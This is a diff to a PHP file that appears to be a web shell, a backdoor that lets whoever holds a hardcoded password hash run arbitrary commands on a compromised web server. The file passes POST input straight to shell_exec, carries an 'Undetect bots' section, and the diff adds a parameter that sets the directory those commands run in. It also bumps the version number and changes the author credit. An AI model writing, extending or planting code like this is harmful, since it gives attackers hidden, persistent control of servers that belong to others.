@@ -1,6 +1,6 @@
 <?php
 session_start();
-define('APP_VER', '0.3');
+define('APP_VER', '0.4');
 $password = defined('PW') ? PW : '5c5fa09440696b310b4b1750d49f84ca';
 
 // Undetect bots
@@ -40,6 +40,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     try {
         $self = basename(__FILE__);
         if($action=='command' && isset($_POST['cmd'])){
+            $cmd_path = isset($_POST['path']) ? $_POST['path'] : getcwd();
+            if (is_dir($cmd_path)) { chdir($cmd_path); }
             if(function_exists('shell_exec')){$output = shell_exec($_POST['cmd'].' 2>&1');}else{$output="Server function disabled!";}
             echo '<pre class="bg-black text-green-400 p-2 rounded">'.$output.'</pre>';
             exit;
@@ -299,6 +301,7 @@ if($action=='serverinfo'):
     <h2 class="text-xl font-bold mb-2">💡 Execute Command</h2>
     <form method="post" onsubmit="$.post('?action=command',$ (this).serialize(),function(d){$('#output').html(d);});return false;">
     <input name="cmd" class="border w-full px-2 py-1 mb-2" placeholder="Enter command...">
+    <input type="hidden" name="path" value="<?=htmlspecialchars($path)?>">
     <button class="bg-green-500 text-white px-3 py-1 rounded">Run</button>
     </form>
     <div id="output" class="mt-2 text-sm"></div>
@@ -416,7 +419,8 @@ toastr.<?= $_SESSION['msg_type']=='error'?'error':'success' ?>("<?= addslashes($
 <footer class="container mx-auto p-4">
       <div class="flex flex-col sm:flex-row justify-between items-center pt-4 border-t border-gray-300">
         <div class="flex-grow lg:w-1/2 text-gray-600">
-              <?=date('Y');?> - <a href="https://www.github.com/willygoid" target="_blank" class="text-blue-700 hover:text-blue-500">@willygoid</a></div>
+              <p class="text-gray-700"></p>Copyleft <?=date('Y');?> @willygoid</p>
+        </div>
         <div class="flex-grow lg:w-1/2 text-gray-600 text-right">
           <p class="font-bold"> <button type="button" id="toggleTheme" class="bg-gray-800 text-white px-2 py-1 rounded">🌙 Dark</button> v<?=APP_VER;?></p>
         </div>
